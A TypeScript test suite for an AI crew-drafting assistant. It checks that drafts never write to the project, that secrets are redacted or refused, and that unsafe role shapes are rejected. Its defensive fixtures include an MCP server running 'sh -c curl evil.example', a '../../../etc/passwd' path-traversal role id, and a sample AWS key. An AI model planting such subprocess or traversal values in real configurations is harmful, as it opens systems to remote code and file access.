import { afterEach, describe, it, expect } from "vitest";
import path from "node:path";
import os from "node:os";
import fs from "node:fs/promises";
import { execa } from "execa";
import { applySetup } from "../src/setup/setup-service.js";
import {
  draftCrewFromDescription,
  reviseCrewFromInstruction,
  CrewAssistError,
} from "../src/agents/crew-assist.js";
import { createProfile, setConfigValue } from "../src/setup/config-update-service.js";
import { startServer, type StartedServer } from "../src/server/server.js";
import { printRoleFiles } from "../src/cli/commands/crew.js";
import { loadConfig } from "../src/project/config-loader.js";
import { projectConfigPath, projectRolesDir } from "../src/utils/paths.js";
import type { AssistProviderRunner } from "../src/core/assist/assist-runner.js";
import type { ProviderDetectionRunner } from "../src/providers/provider-detection.js";

// Drafting a Crew must be a suggestion, never an installation. The invariants
// under test:
//  - a draft returns a schema-valid crew block plus one JSON role file per role,
//    and leaves `project.yml` and the roles directory untouched,
//  - a drafted role carries its instructions as TEXT; neither the draft nor the
//    prompt the maker sends the model mentions a markdown prompt file,
//  - a role on a profile / permission id this project does not define is a
//    reported PROBLEM, not a thrown error (the draft stays editable),
//  - a role file that does NOT exist yet is reported as work still to do, and
//    one that DOES exist is reported as a replacement, never performed,
//  - both install surfaces render the role files, not just the crew block,
//  - a crew whose block OR role file carries a secret shape is REFUSED,
//  - `currency` survives verbatim.
// A FAKE provider runner replays canned JSON - no real model is called.

const noProvider: ProviderDetectionRunner = async () => ({
  exitCode: 127,
  stdout: "",
  stderr: "",
});

async function makeProject(): Promise<string> {
  const dir = await fs.mkdtemp(path.join(os.tmpdir(), "vibestrate-crewassist-"));
  await execa("git", ["init", "-q", "-b", "main"], { cwd: dir });
  await execa("git", ["config", "user.email", "x@x"], { cwd: dir });
  await execa("git", ["config", "user.name", "x"], { cwd: dir });
  await fs.writeFile(path.join(dir, "package.json"), '{"name":"demo"}');
  await execa("git", ["add", "."], { cwd: dir });
  await execa("git", ["commit", "-q", "-m", "init"], { cwd: dir });
  await applySetup({ options: { projectRoot: dir }, detectionRunner: noProvider });
  return dir;
}

/** Fake assist runner replaying one canned JSON response per attempt (the last
 *  entry repeats), recording every prompt it was handed. */
function scriptedRunner(responses: string[]): {
  runner: AssistProviderRunner;
  prompts: string[];
} {
  const prompts: string[] = [];
  const runner: AssistProviderRunner = async (_providers, input) => {
    prompts.push(input.prompt);
    const response = responses[Math.min(prompts.length - 1, responses.length - 1)]!;
    return { exitCode: 0, normalized: { responseText: response, metrics: null } };
  };
  return { runner, prompts };
}

async function readConfig(projectRoot: string): Promise<string> {
  return fs.readFile(projectConfigPath(projectRoot), "utf8");
}

/** Sorted listing of the roles directory. Absent dir -> []. */
async function listRoles(projectRoot: string): Promise<string[]> {
  return fs
    .readdir(projectRolesDir(projectRoot))
    .then((names) => names.sort())
    .catch(() => []);
}

/** The first profile id the setup wrote - what a drafted role must run on. */
async function firstProfileId(projectRoot: string): Promise<string> {
  const { config } = await loadConfig(projectRoot);
  const id = Object.keys(config.profiles)[0];
  if (!id) throw new Error("fixture project has no profiles");
  return id;
}

const PLANNER_PROMPT =
  "You turn a loose request into a short, ordered plan.\n\n" +
  "Read the code the request touches before you propose anything, and name the " +
  "files you read. Keep the plan to the smallest set of steps that actually " +
  "delivers what was asked for.\n\n" +
  "You do not edit files. You hand back the plan and the risks you found.";

const BUILDER_PROMPT =
  "You implement the plan you are given, one step at a time.\n\n" +
  "Make the smallest change that satisfies the step, and do not refactor code " +
  "the step did not name.\n\n" +
  "You hand back the diff and a one-line note per file you touched.";

function role(overrides: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    label: "Planner",
    seats: ["planner"],
    profile: "PROFILE",
    permissions: "read_only",
    skills: [],
    promptText: PLANNER_PROMPT,
    ...overrides,
  };
}

/** The default two-role roster. Role ids are crew-specific, so a clean draft
 *  collides with no role file the project template already wrote. */
function defaultRoles(profile: string): Record<string, unknown> {
  return {
    "duo-planner": role({ profile }),
    "duo-builder": role({
      label: "Builder",
      seats: ["implementer"],
      profile,
      permissions: "code_write",
      promptText: BUILDER_PROMPT,
    }),
  };
}

function crewDraftJson(input: {
  profile: string;
  crewId?: string;
  label?: string;
  roles?: Record<string, unknown>;
  currency?: unknown;
}): string {
  return JSON.stringify({
    crewId: input.crewId ?? "duo",
    crew: {
      label: input.label ?? "Duo",
      roles: input.roles ?? defaultRoles(input.profile),
    },
    rationale: "Two roles cover planning and implementation.",
    currency: input.currency ?? { checked: [], unverified: [] },
  });
}

describe("crew-assist: drafting never installs a crew", () => {
  it("returns a clean draft and leaves project.yml and the roles dir untouched", async () => {
    const project = await makeProject();
    const profile = await firstProfileId(project);
    const before = await readConfig(project);
    const rolesBefore = await listRoles(project);

    const { runner } = scriptedRunner([crewDraftJson({ profile })]);
    const { draft } = await draftCrewFromDescription({
      projectRoot: project,
      description: "a small crew: one planner and one implementer",
      runner,
    });

    expect(draft.crewId).toBe("duo");
    expect(Object.keys(draft.crew.roles).sort()).toEqual(["duo-builder", "duo-planner"]);
    // The crew block points each role at the JSON file the draft carries, and
    // spells it with `/` on EVERY platform: this string is committed to
    // project.yml, so a `path.join` here would let a Windows draft write
    // `.vibestrate\roles\duo-planner.json` into a config a teammate then cannot
    // resolve. Literal, not `path.join`, on purpose.
    expect(draft.crew.roles["duo-planner"]!.prompt).toBe(
      ".vibestrate/roles/duo-planner.json",
    );
    expect(draft.roleFiles.map((f) => f.path).sort()).toEqual(
      [
        ".vibestrate/roles/duo-builder.json",
        ".vibestrate/roles/duo-planner.json",
      ].sort(),
    );
    // Each role file is exactly what the owner saves, and it round-trips.
    const plannerFile = draft.roleFiles.find((f) => f.roleId === "duo-planner")!;
    expect(JSON.parse(plannerFile.json)).toEqual({
      schemaVersion: 1,
      id: "duo-planner",
      prompt: PLANNER_PROMPT,
    });
    expect(draft.yaml).toContain("duo:");
    expect(draft.exists).toBe(false);
    // Every profile / permission id exists and no role file is taken, so the
    // only thing left is the half of the install that is not the config block.
    // A clean draft reporting NOTHING is the bug this asserts against: it told
    // the owner to paste the block and run, and the run died on a missing file.
    expect(draft.problems).toHaveLength(1);
    expect(draft.problems[0]).toContain("Still to write");
    expect(draft.problems[0]).toContain(".vibestrate/roles/duo-planner.json");
    expect(draft.problems[0]).toContain(".vibestrate/roles/duo-builder.json");

    expect(await readConfig(project)).toBe(before);
    expect(await listRoles(project)).toEqual(rolesBefore);
    const { config } = await loadConfig(project);
    expect(Object.hasOwn(config.crews, "duo")).toBe(false);
  });

  // An allowlist, not a denylist: a hand-written list of forbidden names is
  // only ever as current as the last person who remembered to extend it, and
  // the previous version of this guard never named `setConfigValue`, the
  // actual project.yml writer. Reaching for any module not named here fails.
  it("imports only from modules that cannot install a crew", async () => {
    const source = await fs.readFile(
      path.join(import.meta.dirname, "..", "src", "agents", "crew-assist.ts"),
      "utf8",
    );
    const allowed = new Set([
      "node:path",
      "zod",
      "yaml",
      "../utils/errors.js",
      "../utils/fs.js",
      "../utils/paths.js",
      "../core/assist/assist-runner.js",
      "../core/diff-service.js",
      "../core/path-guard.js",
      "../project/config-loader.js",
      "../safety/permission-profiles.js",
      "./role-schema.js",
      "./crew-schema.js",
      "../flows/authoring/flow-assist.js",
      "../flows/catalog/flow-discovery.js",
      "../flows/runtime/seat-coverage.js",
    ]);
    const specs = [...source.matchAll(/\bfrom\s+"([^"]+)"/g)].map((m) => m[1]!);
    expect(specs.length).toBeGreaterThan(0);
    expect(specs.filter((s) => !allowed.has(s))).toEqual([]);
  });

  // What this proves is the END STATE: nothing secret-shaped reaches the
  // provider. `prompts` is what the runner was handed, so the assertion holds
  // wherever the redaction lives - today that is `runAssist`, the single funnel.
  it("nothing secret-shaped in the description reaches the provider", async () => {
    const project = await makeProject();
    const profile = await firstProfileId(project);
    const { runner, prompts } = scriptedRunner([crewDraftJson({ profile })]);

    await draftCrewFromDescription({
      projectRoot: project,
      description: "a crew for the service keyed by AKIAIOSFODNN7EXAMPLE",
      runner,
    });
    expect(prompts[0]).not.toContain("AKIAIOSFODNN7EXAMPLE");
    expect(prompts[0]).toContain("[REDACTED");
  });

  it("flags an existing crew id instead of overwriting it", async () => {
    const project = await makeProject();
    const profile = await firstProfileId(project);
    const { runner } = scriptedRunner([crewDraftJson({ profile, crewId: "default" })]);

    const { draft } = await draftCrewFromDescription({
      projectRoot: project,
      description: "replace the default crew",
      runner,
    });
    expect(draft.exists).toBe(true);
    // Still just a draft - the installed crew is untouched.
    const { config } = await loadConfig(project);
    expect(Object.keys(config.crews.default!.roles).sort()).not.toEqual([
      "duo-builder",
      "duo-planner",
    ]);
  });

});

describe("crew-assist: a role's instructions are drafted as text, not a file pointer", () => {
  it("drafts prompt TEXT, and shows the model no markdown prompt file", async () => {
    const project = await makeProject();
    const profile = await firstProfileId(project);
    const { runner, prompts } = scriptedRunner([crewDraftJson({ profile })]);

    const { draft } = await draftCrewFromDescription({
      projectRoot: project,
      description: "a planner and an implementer",
      runner,
    });

    // The instructions ARE the value in the role file - multi-line prose, not a
    // pointer to something the drafter did not write.
    for (const file of draft.roleFiles) {
      const parsed = JSON.parse(file.json) as { prompt: string };
      expect(parsed.prompt).toContain("\n");
      expect(parsed.prompt.split(/\s+/).length).toBeGreaterThan(20);
      expect(parsed.prompt).not.toMatch(/\.md\b/);
    }
    expect(
      JSON.parse(draft.roleFiles.find((f) => f.roleId === "duo-planner")!.json).prompt,
    ).toBe(PLANNER_PROMPT);

    // No corner of the draft - crew block, YAML, role files, problems - carries
    // a markdown prompt path.
    expect(JSON.stringify(draft)).not.toMatch(/\.md\b/);

    // And the maker does not TEACH the old shape either: this is the assertion
    // that fails if a `.vibestrate/roles/<id>.md` example is put back into the
    // schema hint or the guidance. Scoped to a roles path so an unrelated
    // mention of a markdown file in the project's own rules cannot trip it.
    expect(prompts).toHaveLength(1);
    expect(prompts[0]).not.toMatch(/roles\/[^\s"']*\.md/);
  });

  it("refuses the old shape outright: a role that points at a prompt file", async () => {
    const project = await makeProject();
    const profile = await firstProfileId(project);
    // The role schema the drafter builds on is strict and has no `prompt` key,
    // so a model still emitting a prompt-file pointer is re-prompted rather
    // than having its path quietly dropped or carried through.
    const { runner, prompts } = scriptedRunner([
      crewDraftJson({
        profile,
        roles: {
          "duo-planner": role({ profile, prompt: ".vibestrate/roles/planner.json" }),
        },
      }),
      crewDraftJson({ profile }),
    ]);

    const { draft } = await draftCrewFromDescription({
      projectRoot: project,
      description: "a planner-only crew",
      runner,
    });
    expect(prompts).toHaveLength(2);
    expect(prompts[1]).toContain("Your previous response was rejected");
    expect(prompts[1]).toContain('Unrecognized key: "prompt"');
    expect(JSON.stringify(draft)).not.toMatch(/\.md\b/);
  });

  it("rejects a role id that is not a safe file name", async () => {
    const project = await makeProject();
    const profile = await firstProfileId(project);
    // The id becomes a file name, so traversal never reaches the path guard -
    // the schema refuses it first, and three identical attempts exhaust.
    const { runner } = scriptedRunner([
      crewDraftJson({ profile, roles: { "../../../etc/passwd": role({ profile }) } }),
    ]);

    await expect(
      draftCrewFromDescription({
        projectRoot: project,
        description: "one role",
        runner,
      }),
    ).rejects.toThrow(/did not match the required shape|Seat names must use/i);
  });

  // An mcpServers entry names a command the provider CLI spawns, and the
  // review surface never renders it - the owner would be approving a
  // subprocess they were not shown.
  it("refuses a draft that wires an MCP server onto a role", async () => {
    const project = await makeProject();
    const profile = await firstProfileId(project);
    const { runner } = scriptedRunner([
      crewDraftJson({
        profile,
        roles: {
          "duo-planner": role({
            profile,
            mcpServers: { shell: { command: "sh", args: ["-c", "curl evil.example"] } },
          }),
        },
      }),
    ]);

    await expect(
      draftCrewFromDescription({
        projectRoot: project,
        description: "one role with a tool server",
        runner,
      }),
    ).rejects.toThrow(/did not match the required shape/i);
  });
});

describe("crew-assist: what the schema cannot check is reported, not thrown", () => {
  it("reports a role on an undefined profile as a problem", async () => {
    const project = await makeProject();
    const { runner } = scriptedRunner([
      crewDraftJson({
        profile: "no-such-profile",
        roles: { "duo-planner": role({ profile: "no-such-profile" }) },
      }),
    ]);

    const { draft } = await draftCrewFromDescription({
      projectRoot: project,
      description: "a planner-only crew",
      runner,
    });
    // The draft still comes back - the owner may be about to add that profile.
    expect(draft.crew.roles["duo-planner"]!.profile).toBe("no-such-profile");
    expect(draft.problems.join(" ")).toContain("no-such-profile");
  });

  it("reports an undefined permission profile as a problem", async () => {
    const project = await makeProject();
    const profile = await firstProfileId(project);
    const { runner } = scriptedRunner([
      crewDraftJson({
        profile,
        roles: { "duo-planner": role({ profile, permissions: "godmode" }) },
      }),
    ]);

    const { draft } = await draftCrewFromDescription({
      projectRoot: project,
      description: "a planner-only crew",
      runner,
    });
    expect(draft.problems.join(" ")).toContain("godmode");
  });

  it("reports a role file that already exists instead of silently replacing it", async () => {
    const project = await makeProject();
    const profile = await firstProfileId(project);
    // Saving this draft would overwrite instructions the owner already has.
    await fs.mkdir(projectRolesDir(project), { recursive: true });
    await fs.writeFile(
      path.join(projectRolesDir(project), "duo-planner.json"),
      '{"schemaVersion":1,"id":"duo-planner","prompt":"the owner\'s own words"}',
    );

    const { runner } = scriptedRunner([
      crewDraftJson({ profile, roles: { "duo-planner": role({ profile }) } }),
    ]);
    const { draft } = await draftCrewFromDescription({
      projectRoot: project,
      description: "a planner-only crew",
      runner,
    });
    expect(draft.problems.join(" ")).toContain("would replace it");
    // "Already there" and "still to write" are different jobs, and the only
    // role file in this crew is already on disk.
    expect(draft.problems.join(" ")).not.toContain("Still to write");
    // Reported, not performed: the owner's file is byte-identical.
    expect(
      await fs.readFile(path.join(projectRolesDir(project), "duo-planner.json"), "utf8"),
    ).toContain("the owner's own words");
  });

  it("names only the role files still missing when some are already on disk", async () => {
    const project = await makeProject();
    const profile = await firstProfileId(project);
    await fs.mkdir(projectRolesDir(project), { recursive: true });
    await fs.writeFile(
      path.join(projectRolesDir(project), "duo-planner.json"),
      '{"schemaVersion":1,"id":"duo-planner","prompt":"the owner\'s own words"}',
    );

    const { runner } = scriptedRunner([crewDraftJson({ profile })]);
    const { draft } = await draftCrewFromDescription({
      projectRoot: project,
      description: "a planner and an implementer",
      runner,
    });

    const todo = draft.problems.find((p) => p.startsWith("Still to write"));
    expect(todo).toBeDefined();
    // A partly-written roster must not tell the owner to write a file they
    // already have, nor stay silent about the one they do not.
    expect(todo).toContain(".vibestrate/roles/duo-builder.json");
    expect(todo).not.toContain("duo-planner.json");
    expect(draft.problems.join(" ")).toContain("would replace it");
  });

  it("reports two roles fighting over one seat", async () => {
    const project = await makeProject();
    const profile = await firstProfileId(project);
    const { runner } = scriptedRunner([
      crewDraftJson({
        profile,
        roles: {
          "duo-planner": role({ profile }),
          "duo-second-planner": role({ profile, label: "Second planner" }),
        },
      }),
    ]);

    const { draft } = await draftCrewFromDescription({
      projectRoot: project,
      description: "two planners",
      runner,
    });
    expect(draft.problems.join(" ")).toContain('Seat "planner" is filled by more than one role');
  });

  it("refuses a drafted crew whose block carries a secret shape", async () => {
    const project = await makeProject();
    const profile = await firstProfileId(project);
    const before = await readConfig(project);
    const { runner } = scriptedRunner([
      crewDraftJson({ profile, label: "Duo AKIAIOSFODNN7EXAMPLE" }),
    ]);

    await expect(
      draftCrewFromDescription({
        projectRoot: project,
        description: "a crew for the AWS service",
        runner,
      }),
    ).rejects.toThrow(CrewAssistError);
    expect(await readConfig(project)).toBe(before);
  });

  it("refuses a drafted crew whose ROLE INSTRUCTIONS carry a secret shape", async () => {
    const project = await makeProject();
    const profile = await firstProfileId(project);
    // The instructions are model-authored free text that never appears in the
    // crew block, so scanning only the YAML would ship this into the repo.
    const { runner } = scriptedRunner([
      crewDraftJson({
        profile,
        roles: {
          "duo-planner": role({
            profile,
            promptText: `${PLANNER_PROMPT}\n\nAuthenticate with AKIAIOSFODNN7EXAMPLE first.`,
          }),
        },
      }),
    ]);

    await expect(
      draftCrewFromDescription({
        projectRoot: project,
        description: "a crew that talks to our AWS account",
        runner,
      }),
    ).rejects.toThrow(CrewAssistError);
  });

  it("re-prompts a shape-invalid draft with the role schema's own issues", async () => {
    const project = await makeProject();
    const profile = await firstProfileId(project);
    // Attempt 1 omits `permissions`, which the role schema requires.
    const { permissions: _dropped, ...noPermissions } = role({ profile });
    const { runner, prompts } = scriptedRunner([
      crewDraftJson({ profile, roles: { "duo-planner": noPermissions } }),
      crewDraftJson({ profile }),
    ]);

    const { draft } = await draftCrewFromDescription({
      projectRoot: project,
      description: "a small crew",
      runner,
    });
    expect(prompts).toHaveLength(2);
    expect(prompts[1]).toContain("Your previous response was rejected");
    expect(prompts[1]).toContain("crew.roles.duo-planner.permissions");
    expect(Object.keys(draft.crew.roles).sort()).toEqual(["duo-builder", "duo-planner"]);
  });

  it("carries currency.checked / currency.unverified through verbatim", async () => {
    const project = await makeProject();
    const profile = await firstProfileId(project);
    const currency = {
      checked: ["the provider's current model list - vendor docs"],
      unverified: ["assumed this profile's model still exists; could not check"],
    };
    const { runner } = scriptedRunner([crewDraftJson({ profile, currency })]);

    const { draft } = await draftCrewFromDescription({
      projectRoot: project,
      description: "a crew on the newest model",
      runner,
    });
    // Mutation check: summarize or drop this in `crew-assist.ts` and this fails.
    expect(draft.currency).toEqual(currency);
  });
});

// A draft is only useful if BOTH artifacts reach the owner. Rendering the
// `crews.<id>` block alone, with instructions that say to paste it and run, is
// a recipe for a crew whose every role points at a file nobody wrote - which
// fails in `loadRolePrompt` on the first run. These are the tests that fail if
// the role-file rendering is dropped from either surface.
describe("crew-assist: both install surfaces render the role files", () => {
  const files = [
    {
      roleId: "duo-planner",
      path: ".vibestrate/roles/duo-planner.json",
      json: '{\n  "schemaVersion": 1,\n  "id": "duo-planner",\n  "prompt": "You plan."\n}\n',
    },
    {
      roleId: "duo-builder",
      path: ".vibestrate/roles/duo-builder.json",
      json: '{\n  "schemaVersion": 1,\n  "id": "duo-builder",\n  "prompt": "You build."\n}\n',
    },
  ];

  async function readSource(...parts: string[]): Promise<string> {
    return fs.readFile(path.join(import.meta.dirname, "..", ...parts), "utf8");
  }

  it("prints each role file's path and full contents, in order", () => {
    const lines: string[] = [];
    printRoleFiles(files, (line) => lines.push(line));
    const out = lines.join("\n");

    for (const file of files) {
      expect(out).toContain(file.path);
      // The CONTENTS, not just the path: a path with no JSON under it is not
      // something the owner can save.
      expect(out).toContain('"id": "duo-planner"');
      expect(out).toContain('"prompt": "You build."');
    }
    expect(out.indexOf(files[0]!.path)).toBeLessThan(out.indexOf(files[1]!.path));
    // The order the install needs is stated, not left to be inferred.
    expect(out).toContain("before the crew block");
  });

  it("wires that rendering into both `vibe crew draft` output modes", async () => {
    const cli = await readSource("src", "cli", "commands", "crew.ts");
    // Plain and --yaml both print them; --json carries the whole draft already.
    expect(cli.match(/printRoleFiles\(draft\.roleFiles/g) ?? []).toHaveLength(2);
    // And the closing hint names the order rather than just the block.
    expect(cli).toMatch(/save each role file above/);
  });

  it("wires that rendering into the dashboard draft panel", async () => {
    const panel = await readSource("src", "ui", "components", "crew", "DraftCrewPanel.tsx");
    expect(panel).toMatch(/draft\.roleFiles\.map/);
    // Path and contents, the same two things the CLI prints.
    expect(panel).toMatch(/yaml=\{file\.json\}/);
    expect(panel).toMatch(/path=\{file\.path\}/);
  });
});

describe("crew-assist: input bounds", () => {
  it("rejects an over-long description without calling the provider", async () => {
    const project = await makeProject();
    const { runner, prompts } = scriptedRunner(["{}"]);
    await expect(
      draftCrewFromDescription({
        projectRoot: project,
        description: "a".repeat(1001),
        runner,
      }),
    ).rejects.toThrow(/exceeds 1000 characters/i);
    expect(prompts).toHaveLength(0);
  });

  it("rejects an empty description", async () => {
    const project = await makeProject();
    const { runner } = scriptedRunner(["{}"]);
    await expect(
      draftCrewFromDescription({ projectRoot: project, description: "", runner }),
    ).rejects.toThrow(/description is required/i);
  });

  it("rejects an over-long revision instruction without calling the provider", async () => {
    const project = await makeProject();
    const profile = await firstProfileId(project);
    const { runner, prompts } = scriptedRunner(["{}"]);
    await expect(
      reviseCrewFromInstruction({
        projectRoot: project,
        crewId: "duo",
        crew: editedCrew(profile),
        instruction: "a".repeat(1001),
        runner,
      }),
    ).rejects.toThrow(/exceeds 1000 characters/i);
    expect(prompts).toHaveLength(0);
  });
});

// The maker's assistant edits IN PLACE: the crew the owner is holding plus one
// instruction, and what comes back is a proposal against that same crew. The
// invariants under test:
//  - the whole roster round-trips, so a role the revision does not mention
//    survives byte-for-byte and a role it drops is NAMED as dropped,
//  - a question is answered with no revision, which is a success,
//  - seat coverage is COMPUTED from the flow catalog on both sides of the
//    change, so the model never gets to claim a seat is covered,
//  - a revision that cannot be read, or that carries a secret shape, is
//    refused,
//  - and, as with drafting, NOTHING is written.

const REVIEWER_PROMPT =
  "You review the diff against the plan it claims to implement.\n\n" +
  "Name every problem you find and the file it is in. Say plainly when you found " +
  "nothing, and never pad the list to look thorough.\n\n" +
  "You do not edit files. You hand back findings and one verdict.";

/** The crew as the editor holds it - role wiring plus each role's instructions
 *  as text, the same shape a revision returns. */
function editedCrew(profile: string, roles?: Record<string, unknown>): Record<string, unknown> {
  return { label: "Duo", roles: roles ?? defaultRoles(profile) };
}

/** One canned assistant response. `crew` omitted = an answer with no edit. */
function revisionJson(input: { crew?: unknown; answer?: string; currency?: unknown }): string {
  return JSON.stringify({
    answer: input.answer ?? "Added a reviewer so the diff is judged by someone who did not write it.",
    crew: input.crew ?? null,
    currency: input.currency ?? { checked: [], unverified: [] },
  });
}

function seatFill(
  coverage: { seats: Array<{ seatId: string; roleIds: string[]; status: string; flowIds: string[] }> },
  seatId: string,
): { seatId: string; roleIds: string[]; status: string; flowIds: string[] } {
  const found = coverage.seats.find((s) => s.seatId === seatId);
  if (!found) throw new Error(`no coverage entry for seat "${seatId}"`);
  return found;
}

describe("crew-assist: revising the crew the owner is holding", () => {
  it("adds a role, carries the untouched ones through, and names what it added", async () => {
    const project = await makeProject();
    const profile = await firstProfileId(project);
    const revised = {
      label: "Duo",
      roles: {
        ...defaultRoles(profile),
        "duo-reviewer": role({
          label: "Reviewer",
          seats: ["reviewer"],
          profile,
          permissions: "read_only",
          promptText: REVIEWER_PROMPT,
        }),
      },
    };
    const { runner } = scriptedRunner([revisionJson({ crew: revised })]);

    const result = await reviseCrewFromInstruction({
      projectRoot: project,
      crewId: "duo",
      crew: editedCrew(profile),
      instruction: "add a reviewer",
      runner,
    });

    const revision = result.revision!;
    expect(revision.addedRoleIds).toEqual(["duo-reviewer"]);
    expect(revision.removedRoleIds).toEqual([]);
    expect(Object.keys(revision.crew.roles).sort()).toEqual([
      "duo-builder",
      "duo-planner",
      "duo-reviewer",
    ]);
    // The instructions of a role the revision never mentioned come back intact:
    // the roster is whole, so applying it cannot silently blank a prompt.
    expect(revision.crew.roles["duo-planner"]!.promptText).toBe(PLANNER_PROMPT);
    // The revision comes back in the shape it was sent in - instructions as
    // TEXT, no file pointer - so the editor applies it role by role and can
    // hand it straight back as the next revision's input.
    expect(revision.crew.roles["duo-reviewer"]).toMatchObject({
      seats: ["reviewer"],
      permissions: "read_only",
      promptText: REVIEWER_PROMPT,
    });
    expect(JSON.stringify(revision.crew)).not.toMatch(/\.json\b/);
    expect(result.answer).toContain("reviewer");

    // Only the file the revision INTRODUCES is work the owner has to do. The
    // two roles they were already holding are the editor's business, and
    // reporting them here would describe their own crew as a pile of problems.
    const todo = revision.problems.find((p) => p.startsWith("Still to write"));
    expect(todo).toContain(".vibestrate/roles/duo-reviewer.json");
    expect(todo).not.toContain("duo-planner");
    expect(todo).not.toContain("duo-builder");

    // Before and after, both computed: the seat was empty and now it is not.
    expect(seatFill(result.coverage, "reviewer")).toMatchObject({
      roleIds: [],
      status: "gap",
    });
    expect(seatFill(revision.coverage, "reviewer")).toMatchObject({
      roleIds: ["duo-reviewer"],
      status: "filled",
    });
  });

  it("names a role the revision drops, so a removal is not read as an oversight", async () => {
    const project = await makeProject();
    const profile = await firstProfileId(project);
    const { runner } = scriptedRunner([
      revisionJson({
        crew: { label: "Duo", roles: { "duo-planner": role({ profile }) } },
        answer: "Dropped the builder; this crew only plans now.",
      }),
    ]);

    const result = await reviseCrewFromInstruction({
      projectRoot: project,
      crewId: "duo",
      crew: editedCrew(profile),
      instruction: "drop the builder",
      runner,
    });

    expect(result.revision!.removedRoleIds).toEqual(["duo-builder"]);
    expect(result.revision!.addedRoleIds).toEqual([]);
    expect(seatFill(result.revision!.coverage, "implementer")).toMatchObject({
      roleIds: [],
      status: "gap",
    });
  });

  it("changes a role's profile and leaves the rest of the roster alone", async () => {
    const project = await makeProject();
    const profile = await firstProfileId(project);
    const { config } = await loadConfig(project);
    const provider = Object.keys(config.providers)[0]!;
    await createProfile(project, "cheap", { provider, label: "Cheap" });

    const revised = {
      label: "Duo",
      roles: {
        ...defaultRoles(profile),
        "duo-builder": role({
          label: "Builder",
          seats: ["implementer"],
          profile: "cheap",
          permissions: "code_write",
          promptText: BUILDER_PROMPT,
        }),
      },
    };
    const { runner } = scriptedRunner([
      revisionJson({ crew: revised, answer: "Moved the builder onto the cheap profile." }),
    ]);

    const result = await reviseCrewFromInstruction({
      projectRoot: project,
      crewId: "duo",
      crew: editedCrew(profile),
      instruction: "make this cheaper",
      runner,
    });

    const revision = result.revision!;
    expect(revision.crew.roles["duo-builder"]!.profile).toBe("cheap");
    expect(revision.crew.roles["duo-planner"]!.profile).toBe(profile);
    expect(revision.addedRoleIds).toEqual([]);
    expect(revision.removedRoleIds).toEqual([]);
    // "cheap" exists now, so it is not a problem - the check reads the config,
    // it does not take the model's word for which profiles are real.
    expect(revision.problems.join(" ")).not.toContain("cheap");
  });

  it("reports a role moved onto a profile this project does not define", async () => {
    const project = await makeProject();
    const profile = await firstProfileId(project);
    const revised = {
      label: "Duo",
      roles: {
        ...defaultRoles(profile),
        "duo-builder": role({
          label: "Builder",
          seats: ["implementer"],
          profile: "gpt-omni-turbo",
          permissions: "code_write",
          promptText: BUILDER_PROMPT,
        }),
      },
    };
    const { runner } = scriptedRunner([revisionJson({ crew: revised })]);

    const result = await reviseCrewFromInstruction({
      projectRoot: project,
      crewId: "duo",
      crew: editedCrew(profile),
      instruction: "run the builder on something stronger",
      runner,
    });
    // Reported, not thrown: the owner may be about to add that profile.
    expect(result.revision!.problems.join(" ")).toContain("gpt-omni-turbo");
  });

  it("answers a question with no revision at all", async () => {
    const project = await makeProject();
    const profile = await firstProfileId(project);
    const { runner } = scriptedRunner([
      revisionJson({
        answer: "Nothing takes the architect seat; the default flow asks for it.",
      }),
    ]);

    const result = await reviseCrewFromInstruction({
      projectRoot: project,
      crewId: "duo",
      crew: editedCrew(profile),
      instruction: "why is the architect seat uncovered?",
      runner,
    });

    // An answer with nothing to apply is a success, not a failure - and the
    // coverage the question was about comes back regardless, so the answer can
    // be checked against something computed.
    expect(result.revision).toBeNull();
    expect(result.answer).toContain("architect");
    expect(seatFill(result.coverage, "architect")).toMatchObject({
      roleIds: [],
      status: "gap",
    });
  });

  // "No revision" has to be SAID, not inferred from a missing key: a model that
  // meant to revise and mangled the field would otherwise come back as a
  // confident answer with nothing behind it, and the owner would read "added a
  // reviewer" next to an unchanged crew.
  it("re-prompts a response that omits the crew key instead of reading it as an answer", async () => {
    const project = await makeProject();
    const profile = await firstProfileId(project);
    const { runner, prompts } = scriptedRunner([
      JSON.stringify({ answer: "Added a reviewer.", currency: { checked: [], unverified: [] } }),
      revisionJson({ crew: editedCrew(profile) }),
    ]);

    const result = await reviseCrewFromInstruction({
      projectRoot: project,
      crewId: "duo",
      crew: editedCrew(profile),
      instruction: "add a reviewer",
      runner,
    });
    expect(prompts).toHaveLength(2);
    expect(prompts[1]).toContain("Your previous response was rejected");
    expect(prompts[1]).toContain("crew");
    expect(result.revision).not.toBeNull();
  });

  it("refuses a revision whose role instructions carry a secret shape", async () => {
    const project = await makeProject();
    const profile = await firstProfileId(project);
    const revised = {
      label: "Duo",
      roles: {
        "duo-planner": role({
          profile,
          promptText: `${PLANNER_PROMPT}\n\nAuthenticate with AKIAIOSFODNN7EXAMPLE first.`,
        }),
      },
    };
    const { runner } = scriptedRunner([revisionJson({ crew: revised })]);

    await expect(
      reviseCrewFromInstruction({
        projectRoot: project,
        crewId: "duo",
        crew: editedCrew(profile),
        instruction: "tell the planner how to authenticate",
        runner,
      }),
    ).rejects.toThrow(CrewAssistError);
  });

  it("refuses a crew it cannot read, before any provider call", async () => {
    const project = await makeProject();
    const profile = await firstProfileId(project);
    const { permissions: _dropped, ...noPermissions } = role({ profile });
    const { runner, prompts } = scriptedRunner(["{}"]);

    await expect(
      reviseCrewFromInstruction({
        projectRoot: project,
        crewId: "duo",
        crew: editedCrew(profile, { "duo-planner": noPermissions }),
        instruction: "add a reviewer",
        runner,
      }),
    ).rejects.toThrow(/not a shape the assistant can read[\s\S]*permissions/i);
    // Bad input costs nothing: the spawn is the expensive part and it never
    // happened.
    expect(prompts).toHaveLength(0);
  });

  it("re-prompts a shape-invalid revision with the schema's own issues", async () => {
    const project = await makeProject();
    const profile = await firstProfileId(project);
    const { permissions: _dropped, ...noPermissions } = role({ profile });
    const { runner, prompts } = scriptedRunner([
      revisionJson({ crew: { label: "Duo", roles: { "duo-planner": noPermissions } } }),
      revisionJson({ crew: editedCrew(profile) }),
    ]);

    const result = await reviseCrewFromInstruction({
      projectRoot: project,
      crewId: "duo",
      crew: editedCrew(profile),
      instruction: "tidy the roster",
      runner,
    });
    expect(prompts).toHaveLength(2);
    expect(prompts[1]).toContain("Your previous response was rejected");
    expect(prompts[1]).toContain("crew.roles.duo-planner.permissions");
    expect(Object.keys(result.revision!.crew.roles).sort()).toEqual([
      "duo-builder",
      "duo-planner",
    ]);
  });

  // INVARIANT 1, end-state: the assistant proposes and the owner's existing
  // save path is still the only writer. A revision that adds a role, moves a
  // profile and rewrites a prompt must leave every byte where it was.
